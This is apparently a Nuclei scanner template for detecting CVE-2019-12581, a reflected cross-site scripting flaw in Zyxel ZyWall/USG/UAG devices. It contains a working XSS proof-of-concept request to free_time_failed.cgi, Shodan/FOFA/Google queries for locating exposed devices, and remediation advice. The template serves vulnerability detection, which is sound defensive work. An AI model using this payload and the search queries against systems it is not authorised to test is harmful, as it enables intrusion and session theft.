http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain);</script>
    - Please contact with administrator.
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>'
id: CVE-2019-12581
info:
  author: n-thumann
  classification:
    cpe: cpe:2.3:h:zyxel:uag2100:-:*:*:*:*:*:*:*
    cve-id: CVE-2019-12581
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97973
    epss-score: 0.55651
  description: Zyxel ZyWall, USG, and UAG devices allow remote attackers to inject
    arbitrary web script or HTML via the err_msg parameter free_time_failed.cgi CGI
    program, aka reflective cross-site scripting.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: title="zywall"
    google-query: intitle:"zywall"
    max-request: 1
    product: uag2100
    shodan-query: http.title:"ZyWall"
    vendor: zyxel
  name: Zyxel ZyWal/USG/UAG Devices - Cross-Site Scripting
  reference:
  - https://www.zyxel.com/support/vulnerabilities-related-to-the-Free-Time-feature.shtml
  - https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-in-zxel-zywall/
  - https://n-thumann.de/blog/zyxel-gateways-missing-access-control-in-account-generator-xss/
  - https://nvd.nist.gov/vuln/detail/CVE-2019-12581
  - https://www.zyxel.com/us/en/
  remediation: 'Apply the latest firmware update provided by Zyxel to fix the XSS
    vulnerability.

    '
  severity: medium
  tags: cve,cve2019,zyxel,zywall,xss,vuln
